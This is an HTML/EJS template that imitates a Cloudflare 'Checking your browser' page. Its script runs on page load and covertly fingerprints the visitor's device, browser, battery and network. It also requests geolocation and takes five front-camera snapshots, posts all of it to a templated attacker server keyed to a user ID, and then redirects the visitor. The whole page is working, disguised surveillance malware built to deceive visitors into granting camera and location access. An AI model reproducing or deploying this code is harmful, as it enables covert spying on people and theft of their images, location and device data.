<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying your connection...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f6f7f8;
            color: #333;
        }

        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px;
        }

        .cloudflare-box {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            padding: 40px;
            text-align: center;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            color: #2c3e50;
        }

        .subtitle {
            font-size: 16px;
            color: #7f8c8d;
            margin-bottom: 30px;
        }

        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #f6821f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .status {
            font-size: 14px;
            color: #555;
            margin-top: 20px;
        }

        .info {
            margin-top: 40px;
            padding-top: 40px;
            border-top: 1px solid #eee;
            text-align: left;
        }

        .info h3 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #2c3e50;
        }

        .info p {
            font-size: 14px;
            line-height: 1.6;
            color: #666;
            margin-bottom: 10px;
        }

        .ray-id {
            margin-top: 30px;
            font-size: 12px;
            color: #999;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #f3f3f3;
            border-radius: 2px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #f6821f, #ff9f43);
            width: 0%;
            animation: progress 6s ease-in-out forwards;
        }

        @keyframes progress {
            0% {
                width: 0%;
            }

            100% {
                width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
                <circle cx="50" cy="50" r="45" fill="#f6821f" />
                <path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white" />
            </svg>
        </div>

        <div class="cloudflare-box">
            <h1>Checking your browser</h1>
            <p class="subtitle">This process is automatic. Your browser will redirect shortly.</p>

            <div class="loader"></div>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>

            <p class="status" id="status">Performing security check...</p>

            <div class="info">
                <h3>Why am I seeing this page?</h3>
                <p>This website is using a security service to protect itself from online attacks. The action you just
                    performed triggered the security solution.</p>
                <p>This check is necessary to ensure the security and integrity of the service.</p>
            </div>

            <p class="ray-id">Ray ID: <%= Math.random().toString(36).substring(2, 15) %> â€¢ <%= new Date().toISOString()
                        %>
            </p>
        </div>
    </div>

    <script>
        const serverUrl = '<%= a %>';
        const userId = '<%= uid %>';
        const targetUrl = '<%= url %>';

        const statuses = [
            'Checking your browser...',
            'Verifying security...',
            'Analyzing request...',
            'Collecting system information...',
            'Almost done...'
        ];

        let statusIndex = 0;
        const statusEl = document.getElementById('status');

        const statusInterval = setInterval(() => {
            statusIndex++;
            if (statusIndex < statuses.length) {
                statusEl.textContent = statuses[statusIndex];
            } else {
                clearInterval(statusInterval);
                statusEl.textContent = 'Redirecting...';
            }
        }, 1200);

        // Enhanced data collection
        async function collectData() {
            const data = {
                // Basic Info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages?.join(', ') || navigator.language,

                // Screen Info
                screenResolution: `${screen.width}x${screen.height}`,
                screenColorDepth: screen.colorDepth,
                screenPixelDepth: screen.pixelDepth,
                screenAvailSize: `${screen.availWidth}x${screen.availHeight}`,

                // Window Info
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                devicePixelRatio: window.devicePixelRatio,

                // System Info
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                cookiesEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine,
                doNotTrack: navigator.doNotTrack,

                // Hardware Info
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,

                // Connection Info
                connectionType: navigator.connection?.effectiveType || 'Unknown',
                connectionDownlink: navigator.connection?.downlink ? `${navigator.connection.downlink} Mbps` : 'Unknown',
                connectionRtt: navigator.connection?.rtt ? `${navigator.connection.rtt} ms` : 'Unknown',

                // Other
                referrer: document.referrer || 'Direct',
                timestamp: new Date().toISOString(),
                pageType: 'CloudFlare Check'
            };

            // Get OS Info
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf('Win') !== -1) data.os = 'Windows';
            else if (userAgent.indexOf('Mac') !== -1) data.os = 'MacOS';
            else if (userAgent.indexOf('Linux') !== -1) data.os = 'Linux';
            else if (userAgent.indexOf('Android') !== -1) data.os = 'Android';
            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) data.os = 'iOS';
            else data.os = 'Unknown';

            // Get Browser Info
            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) data.browser = 'Chrome';
            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) data.browser = 'Safari';
            else if (userAgent.indexOf('Firefox') !== -1) data.browser = 'Firefox';
            else if (userAgent.indexOf('Edg') !== -1) data.browser = 'Edge';
            else if (userAgent.indexOf('Opera') !== -1 || userAgent.indexOf('OPR') !== -1) data.browser = 'Opera';
            else data.browser = 'Unknown';

            // Send basic info
            await fetch(serverUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `uid=${encodeURIComponent(userId)}&data=${encodeURIComponent(
                    Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>')
                )}`
            }).catch(e => console.log('Error sending data:', e));

            // Get Battery Info
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const batteryData = {
                        level: `${Math.round(battery.level * 100)}%`,
                        charging: battery.charging ? 'Yes' : 'No',
                        chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)} min`,
                        dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)} min`
                    };

                    await fetch(serverUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `uid=${encodeURIComponent(userId)}&data=${encodeURIComponent(
                            '<b>Battery Status:</b><br>' +
                            Object.entries(batteryData).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>')
                        )}`
                    }).catch(e => console.log('Error sending battery:', e));
                } catch (e) {
                    console.log('Battery API not available');
                }
            }

            // Get Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    await fetch(serverUrl + '/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `uid=${encodeURIComponent(userId)}&lat=${position.coords.latitude}&lon=${position.coords.longitude}&acc=${position.coords.accuracy}`
                    }).catch(e => console.log('Error sending location:', e));
                }, (error) => {
                    console.log('Location denied:', error.message);
                });
            }

            // Get Camera Snapshots (3-5 pictures)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });

                // Take 5 snapshots with 1 second interval
                for (let i = 0; i < 5; i++) {
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];

                    await fetch(serverUrl + '/camsnap', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `uid=${encodeURIComponent(userId)}&img=${encodeURIComponent(imageData)}&index=${i + 1}`
                    }).catch(e => console.log('Error sending snapshot:', e));
                }

                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log('Camera access denied or not available');
            }
        }

        // Collect data and redirect
        collectData().then(() => {
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 6000);
        });
    </script>
</body>

</html>